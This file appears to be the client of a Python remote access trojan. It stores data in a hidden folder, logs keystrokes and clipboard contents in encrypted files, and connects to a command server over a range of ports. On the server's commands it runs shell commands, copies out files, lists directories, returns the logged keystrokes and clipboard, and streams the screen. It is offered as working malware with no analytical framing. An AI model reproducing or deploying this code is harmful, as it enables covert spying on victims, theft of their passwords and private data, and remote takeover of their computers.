import time
import platform
import subprocess
import requests
import json
import pyautogui
import numpy as np
import cv2
import os
import pickle
import pyperclip
import threading
from pynput import keyboard
from cryptography.fernet import Fernet
from datetime import datetime
from connection_module import SecureConnectionClient

start_port, end_port = 50000, 50100

SERVER_IP = '127.0.0.1'

DEFAULT_CHUNK_SIZE = 1024 * 1024 * 16
HIDDEN_DIR = os.path.join(os.path.expanduser("~"), ".temp_hidden")
KEY_FILE = os.path.join(HIDDEN_DIR, ".enc_key")
DATA_FILE = os.path.join(HIDDEN_DIR, ".data_store")
KEYSTROKE_FILE = os.path.join(HIDDEN_DIR, ".keystroke_store")

def get_ip_and_country():
    response = requests.get("https://api.ipify.org?format=json")
    ip = response.json()['ip']
    response = requests.get(f"https://ipinfo.io/{ip}/json")
    data = response.json()
    country = data.get('country', 'Unknown')
    return ip, country

def system_info(client):
    operation_system = platform.system()
    cmd = "systeminfo" if operation_system == "Windows" else "lscpu"
    encoding = 'cp866' if operation_system == "Windows" else 'utf-8'
    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding=encoding)
    stdout, stderr = process.communicate()
    client.send_data_AES((stdout + stderr).encode("utf-8"))

def command_line(client):
    operation_system = platform.system()
    encoding = 'cp866' if operation_system == "Windows" else 'utf-8'
    while True:
        command = client.receive_data_AES().decode("utf-8")
        if command == "exit":
            break
        if operation_system == "Windows":
            command = f'cmd /c {command}'
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding=encoding)
        stdout, stderr = process.communicate()
        client.send_data_AES((stdout + stderr).encode("utf-8"))
    
def remote_file_copy(client):
    try:
        file_path = client.receive_data_AES().decode("utf-8")
        with open(file_path, 'rb') as file:
            while True:
                chunk = file.read(DEFAULT_CHUNK_SIZE)
                if not chunk:
                    break
                client.send_data_AES(chunk)
        client.send_data_AES(b"EOF")
    except Exception as e:
        client.send_data_AES(f"ERROR: {str(e)}".encode("utf-8"))

def send_file(client):
    try:
        file_path = client.receive_data_AES().decode("utf-8")
        file_size = os.path.getsize(file_path)
        client.send_data_AES(str(file_size).encode("utf-8")) 

        with open(file_path, 'rb') as file:
            while True:
                chunk = file.read(DEFAULT_CHUNK_SIZE)
                if not chunk:
                    break
                client.send_data_AES(chunk)
        client.send_data_AES(b"EOF")
    except Exception as e:
        client.send_data_AES(f"ERROR: {str(e)}".encode("utf-8"))

def list_directory(client):
    try:
        path = client.receive_data_AES().decode("utf-8")
        if not os.path.isdir(path):
            client.send_data_AES(b"ERROR: Not a directory")
            return
        files = os.listdir(path)
        client.send_data_AES(pickle.dumps(files))
    except Exception as e:
        client.send_data_AES(f"ERROR: {str(e)}".encode("utf-8"))

def input_capture(client):
    key = load_key()
    keystroke_history = load_keystrokes(key)
    
    if keystroke_history:
        try:
            json_data = json.dumps(keystroke_history)
        except (TypeError, ValueError) as e:
            json_data = json.dumps([]) 
    else:
        json_data = json.dumps([]) 

    client.send_data_AES(json_data.encode("utf-8"))

def clipboard_data(client):
    clipboard_history = load_clipboard_history()
    clipboard_history_json = json.dumps(clipboard_history)
    clipboard_history_bytes = clipboard_history_json.encode('utf-8')
    client.send_data_AES(clipboard_history_bytes)

def screenshot_capture(client):
    pass

def audio_capture(client):
    pass

def video_capture(client):
    pass

def screen_capture(client):
    capturing = True
    while capturing:
        screenshot = pyautogui.screenshot()
        screenshot_np = np.array(screenshot)
        screenshot_np = cv2.resize(screenshot_np, (1280, 720))
        screenshot_np = cv2.cvtColor(screenshot_np, cv2.COLOR_BGR2GRAY)
        img_data = screenshot_np.tobytes()
        try:
            client.send_data_AES(img_data)
        except Exception as e:
            raise e
        signal = client.receive_data_AES()
        if signal == b"STOP":
            capturing = False

def ensure_hidden_dir():
    if not os.path.exists(HIDDEN_DIR):
        os.makedirs(HIDDEN_DIR)

def generate_key():
    ensure_hidden_dir()
    key = Fernet.generate_key()
    save_key(key)
    return key

def load_key():
    ensure_hidden_dir()
    with open(KEY_FILE, "rb") as key_file:
        return key_file.read()

def save_key(key):
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)

def encrypt_data(data, key):
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(json.dumps(data).encode())
    return encrypted_data

def decrypt_data(encrypted_data, key):
    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(encrypted_data).decode()
    return json.loads(decrypted_data)

def save_clipboard_history(history, key):
    encrypted_data = encrypt_data(history, key)
    with open(DATA_FILE, "wb") as file:
        file.write(encrypted_data)

def load_clipboard_history(key):
    if not os.path.exists(DATA_FILE):
        return []
    with open(DATA_FILE, "rb") as file:
        encrypted_data = file.read()
    clipboard_data = decrypt_data(encrypted_data, key)
    return clipboard_data

def save_keystrokes(keystrokes, key):
    encrypted_data = encrypt_data(keystrokes, key)
    with open(KEYSTROKE_FILE, "wb") as file:
        file.write(encrypted_data)

def load_keystrokes(key):
    if not os.path.exists(KEYSTROKE_FILE):
        return []
    with open(KEYSTROKE_FILE, "rb") as file:
        encrypted_data = file.read()
    keystroke_data = decrypt_data(encrypted_data, key)
    return keystroke_data

def get_clipboard_content():
    return pyperclip.paste()

def track_clipboard():
    last_content = None
    key = load_key()
    while True:
        current_content = get_clipboard_content()
        if current_content != last_content:
            timestamp = datetime.now().isoformat()
            clipboard_entry = {"content": current_content, "timestamp": timestamp}
            
            clipboard_history = load_clipboard_history(key)
            clipboard_history.append(clipboard_entry)
            save_clipboard_history(clipboard_history, key)
            
            last_content = current_content
        time.sleep(1)

def on_press(key):
    record_key_event(key, 'pressed')

def on_release(key):
    record_key_event(key, 'released')

def record_key_event(key, event_type):
    try:
        key_data = {
            "key": key.char,
            "event_type": event_type,
            "timestamp": datetime.now().isoformat()
        }
    except AttributeError:
        key_data = {
            "key": str(key),
            "event_type": event_type,
            "timestamp": datetime.now().isoformat()
        }

    keystroke_history = load_keystrokes(load_key())
    keystroke_history.append(key_data)
    save_keystrokes(keystroke_history, load_key())

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    return listener

def start_tracking():
    tracker_thread = threading.Thread(target=track_clipboard)
    tracker_thread.daemon = True
    tracker_thread.start()

    keylogger_listener = start_keylogger()
    return tracker_thread, keylogger_listener

def main():
    ensure_hidden_dir()
    if not os.path.exists(KEY_FILE):
        generate_key()
    tracker_thread, keylogger_listener = start_tracking()
    while True:
        try:
            for port in range(start_port, end_port):
                try:
                    client = SecureConnectionClient(server_ip=SERVER_IP, server_port=port)
                    break
                except Exception as e:
                    pass
            ip, country = get_ip_and_country()
            operation_system = platform.system()
            cmd = "systeminfo" if operation_system == "Windows" else "lscpu"
            encoding = 'cp866' if operation_system == "Windows" else 'utf-8'
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding=encoding)
            stdout, stderr = process.communicate()
            systeminfo = stdout + stderr
            data = {"ip": ip, "country": country, "os": operation_system, "systeminfo": systeminfo}
            json_data = json.dumps(data)
            json_bytes = json_data.encode("utf-8")
            client.send_data_AES(json_bytes)
            
            while True:
                command = client.receive_data_AES()
                if command == b"SI":
                    system_info(client)
                elif command == b"CMD":
                    command_line(client)
                elif command == b"RFC":
                    remote_file_copy(client)
                elif command == b"LSD":
                    list_directory(client)
                elif command == b"SND":
                    send_file(client)
                elif command == b"IC":
                    input_capture(client)
                elif command == b"CD":
                    clipboard_data(client)
                elif command == b"SCC":
                    screenshot_capture(client)
                elif command == b"AC":
                    audio_capture(client)
                elif command == b"VC":
                    video_capture(client)
                elif command == b"SC":
                    screen_capture(client)
                elif command == 'exit':
                    break

            client.close()
        except Exception as e:
            pass
        time.sleep(15)

if __name__ == "__main__":
    main()
